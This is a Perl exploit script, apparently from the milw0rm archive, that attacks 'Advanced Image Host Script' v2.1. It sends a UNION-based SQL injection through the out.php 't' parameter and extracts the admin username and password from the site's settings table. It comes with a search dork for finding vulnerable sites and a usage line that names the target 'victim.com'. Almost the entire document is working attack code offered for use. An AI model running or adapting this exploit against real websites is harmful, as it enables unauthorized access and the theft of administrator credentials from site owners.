#!/usr/bin/perl -w
##########################################################
#                Advanced Image Host Script              #
#    Powered by: AIH <=  v2.1 - Remote SQL Inj Exploit   #
##########################################################
#  dork:Powered by: AIH v2.1
#  exploit aported password not crypted
#  exploit tatjibe password mdecryptÃ© :d
#  mgharba :d:d:d:d
########################################
#[*] Founded by : Stack-Terrorist [v40]
#[*] Contact: Ev!L
#[*] Greetz : Houssamix & Djekmani & Jadi & iuoisn & All muslims HaCkeRs  :)
########################################
#----------------------------------------------------------------------------#
########################################
# * TITLE:          PerlSploit Class
# * REQUIREMENTS:   PHP 4 / PHP 5
# * VERSION:        v.1
# * LICENSE:        GNU General Public License
# * ORIGINAL URL:   http://www.v4-Team/v4.txt
# * FILENAME:       PerlSploitClass.pl
# *
# * CONTACT:        dj-moad@hotmail.fr (french / english / arabic / moroco Darija :d )
# * GREETZ:         Houssamix & Djekmani
# * THNX : AllaH
 ########################################
system("color a");
print "\t\t############################################################\n\n";
print "\t\t#                        Viva Islam                        #\n\n";
print "\t\t#                 Advanced Image Host Script               #\n\n";
print "\t\t#     Powered by: AIH <=  v2.1 - Remote SQL Inj Exploit    #\n\n";
print "\t\t#                 by Stack-Terrorist [v40]                 #\n\n";
print "\t\t############################################################\n\n";
########################################
#----------------------------------------------------------------------------#
########################################
use LWP::UserAgent;
die "Example: perl $0 http://victim.com/\n" unless @ARGV;
system("color f");
########################################
#----------------------------------------------------------------------------#
########################################
#the username
$user="admin";
#the pasword
$pass="pass";
#the tables
$tab="setting";
########################################
#----------------------------------------------------------------------------#
########################################
$b = LWP::UserAgent->new() or die "Could not initialize browser\n";
$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
########################################
#----------------------------------------------------------------------------#
########################################
$host = $ARGV[0] . "/out.php?t=-1'/**/union/**/select/**/2,2,2,2,2,2,concat(CHAR(60,117,115,101,114,62),".$user.",CHAR(60,98,115,62,60,98,107,62),CHAR(60,112,97,115,115,62),".$pass.",CHAR(60,98,107,62,60,98,115,62)),2,2,2,2,2,2+from+".$tab."/*";
########################################
#----------------------------------------------------------------------------#
########################################
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content;
########################################
#----------------------------------------------------------------------------#
########################################
if ($answer =~ /<user>(.*?)<bs><bk>/){
        print "\nBrought to you by v4-team.com...\n";
        print "\n[+] Admin User : $1";
}
########################################
#----------------------------------------------------------------------------#
########################################
if ($answer =~ /<pass>(.*?)<bk><bs>/){print "\n[+] Admin password : $1\n\n";
print "\t\t#   Exploit has ben aported user and password    #\n\n";}
########################################
#----------------------------------------------------------------------------#
########################################
else{print "\n[-] Exploit Failed...\n";}
########################################
#----------------------------------------------------------------------------#
########################################
#----------------------------------------------------------------------------#
#              exploit exploited by Stack-Terrorist                              #
#----------------------------------------------------------------------------#
########################################
#----------------------------------------------------------------------------#
########################################

# milw0rm.com [2008-05-12]